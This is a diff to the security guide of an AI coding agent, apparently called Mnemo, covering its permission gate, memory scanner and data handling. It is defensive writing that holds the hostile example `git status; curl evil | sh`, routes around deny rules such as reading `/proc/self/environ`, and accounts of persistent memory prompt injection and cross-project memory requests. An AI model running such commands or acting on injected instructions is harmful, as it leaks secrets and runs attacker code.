@@ -33,6 +33,32 @@ call that would ask is **allowed**: it behaves like `yolo`, and only `deny`
 rules still apply. Run `-p`, `--yolo` and best-of (`--best-of`, `/bestof`) only
 in a place you can afford to lose: a container, a throwaway checkout.
 
+### What the gate is, and is not
+
+- **`deny` rules are a filter, best effort.** A rule such as `env*` is tested
+  against every command in a line, looking through spacing, `VAR=x` prefixes,
+  directories, `sudo`/`env` wrappers and `sh -c '…'`, and a deny beats every mode and
+  every `allow`. It does not understand every way to say the same thing
+  (`printenv`, `cat /proc/self/environ`, `python -c`, a script that was written
+  first), and it does not reach into the Python tool (`ipy_run`). Deny what you
+  mind, not just one spelling of it, and use `default` mode when it matters.
+- **`allow` rules and "always" grants end on a word and never cover a compound
+  command.** `git status*` does not cover `git status; curl evil | sh`, and an
+  approval of `rm -rf dist` covers exactly that command.
+- **`accept-edits` means edits inside this project.** Paths are resolved the way the
+  tools resolve them (`~`, `@`, `file://`, symlinks). `.git`, `.pi`, `.agents`,
+  `.mnemo`, `.github` and similar still ask, because what is written there runs
+  later. Skills are always asked about.
+- **Reads are free, except credentials.** `read`, `grep`, `find` and `ls` never ask,
+  but refuse Mnemo's own `auth.json`, `~/.ssh`, `~/.aws` and `~/.gnupg`. A shell
+  command can still `cat` them if you approve it.
+- **A folder's own `.pi/` extensions, settings, prompts and skills run code and
+  steer the model**, so Mnemo loads them only for a folder you have trusted: it asks
+  once at start-up (`a` remembers it), headless runs skip them unless you pass
+  `--trust-project`. Do not trust a repository you have not read.
+- A `permissions.json` that exists but cannot be parsed stops all edits and
+  commands until it is fixed, rather than quietly dropping your deny rules.
+
 ## What leaves your machine
 
 - **Your prompts, the files and command output the model reads, and your
@@ -42,7 +68,12 @@ in a place you can afford to lose: a container, a throwaway checkout.
   it: `--version`, `doctor`, `--demo` and `memory status` open no network
   connection at all; only a real prompt does, and only to your provider.
 - Memory is stored locally under `$MNEMO_HOME` (default `~/.mnemo`) in a
-  journal file. It is never uploaded by Mnemo.
+  journal file, readable only by you. It is never uploaded by Mnemo. **One
+  exception, opt in:** if `OPENROUTER_API_KEY` is set, the text of memories is
+  sent to OpenRouter to compute embeddings. Leave it unset and nothing is sent;
+  search then uses a local hashing embedder. The embedding address must be
+  `https://` (or local), and is read from the real environment or
+  `$MNEMO_HOME/.env`, never from the folder you are working in.
 
 ## Credentials
 
@@ -74,7 +105,25 @@ memory is a prompt injection that persists. Facts that look like
 instructions to steer, exfiltrate or hide are refused at write time
 (`packages/memory/src/safety.ts`), recalled items are labelled as candidates
 rather than facts, `/memory` and the memory map show what it holds and
-`/forget` retires a fact. This is a defence in depth, not a guarantee.
+`/forget` retires a fact. The scanner reads text the way a person would (width
+forms, lookalike letters, invisible characters, line breaks) and also covers the
+session record, but it is a list of patterns: a paraphrase can get past it, which
+is why a recorded fix is shown to the model as a note and not an order, and why a
+fact is a single line. This is a defence in depth, not a guarantee.
+
+Two things to know when other agents share the memory: a project's identity comes
+from its git `origin` (a repository that copies another's remote URL shares its
+memory), and the MCP server takes the project from each call, so a model that is
+prompt-injected can ask for another project's memory. Only attach memory to agents
+and repositories you trust with all of it.
+
+## The legacy stack
+
+`agent/`, `harness-engine/`, `tui-go/` and `scripts/install.sh` are the previous
+implementation, kept as a specification and **not maintained**. They predate several
+of the protections above: a repository's own `.mnemo/permissions.json` and hooks can
+run code when opened, and the agent does not ask before acting unless the Go
+interface starts it. Do not run them on a repository you do not trust. Use `mnemo`.
 
 ## Verifying a download
 
@@ -82,4 +131,8 @@ Each release ships `SHA256SUMS`; the install scripts check it before
 installing. Release archives are built by GitHub Actions from the tagged
 commit and carry a build-provenance attestation:
 
-    gh attestation verify mnemo-linux-x64.tar.gz --repo AtmanMishra/Mnemo
+    gh attestation verify mnemo-linux-x64.tar.gz --repo AtmanMishra/Mnemo \
+      --source-ref refs/tags/v0.1.0
+
+The checksum catches a corrupted download, not a compromised release (it is
+published beside the archive); the attestation is the provenance check.
